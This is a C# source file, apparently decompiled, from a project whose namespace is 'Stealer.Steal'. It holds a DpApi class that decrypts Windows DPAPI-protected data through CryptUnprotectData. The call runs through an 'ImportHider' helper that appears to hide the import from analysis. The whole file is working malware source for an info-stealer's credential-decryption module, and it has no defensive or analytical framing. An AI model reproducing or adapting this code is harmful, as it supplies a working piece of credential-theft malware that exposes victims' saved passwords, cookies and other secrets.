using System;
using System.Runtime.InteropServices;
using Stealer.Steal.Helper;

namespace Stealer.Steal.Decrypt;

public class DpApi
{
	private delegate bool CryptUnprotectData(ref DataBlob pCipherText, ref string pszDescription, ref DataBlob pEntropy, IntPtr pReserved, ref CryptprotectPromptstruct pPrompt, int dwFlags, ref DataBlob pPlainText);

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	private struct CryptprotectPromptstruct
	{
		public int cbSize;

		public int dwPromptFlags;

		public IntPtr hwndApp;

		public string szPrompt;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	private struct DataBlob
	{
		public int cbData;

		public IntPtr pbData;
	}

	public static byte[] Decrypt(byte[] bCipher)
	{
		DataBlob pEntropy = default(DataBlob);
		DataBlob pPlainText;
		DataBlob pCipherText = (pPlainText = pEntropy);
		CryptprotectPromptstruct cryptprotectPromptstruct = default(CryptprotectPromptstruct);
		cryptprotectPromptstruct.cbSize = Marshal.SizeOf(typeof(CryptprotectPromptstruct));
		cryptprotectPromptstruct.dwPromptFlags = 0;
		cryptprotectPromptstruct.hwndApp = IntPtr.Zero;
		cryptprotectPromptstruct.szPrompt = null;
		CryptprotectPromptstruct pPrompt = cryptprotectPromptstruct;
		string pszDescription = string.Empty;
		try
		{
			try
			{
				if (bCipher == null)
				{
					bCipher = new byte[0];
				}
				pCipherText.pbData = Marshal.AllocHGlobal(bCipher.Length);
				pCipherText.cbData = bCipher.Length;
				Marshal.Copy(bCipher, 0, pCipherText.pbData, bCipher.Length);
			}
			catch
			{
			}
			ImportHider.HiddenCallResolve<CryptUnprotectData>("crypt32.dll", "CryptUnprotectData")(ref pCipherText, ref pszDescription, ref pEntropy, IntPtr.Zero, ref pPrompt, 1, ref pPlainText);
			byte[] array = new byte[pPlainText.cbData];
			Marshal.Copy(pPlainText.pbData, array, 0, pPlainText.cbData);
			return array;
		}
		catch
		{
		}
		finally
		{
			if (pPlainText.pbData != IntPtr.Zero)
			{
				Marshal.FreeHGlobal(pPlainText.pbData);
			}
			if (pCipherText.pbData != IntPtr.Zero)
			{
				Marshal.FreeHGlobal(pCipherText.pbData);
			}
			if (pEntropy.pbData != IntPtr.Zero)
			{
				Marshal.FreeHGlobal(pEntropy.pbData);
			}
		}
		return new byte[0];
	}
}
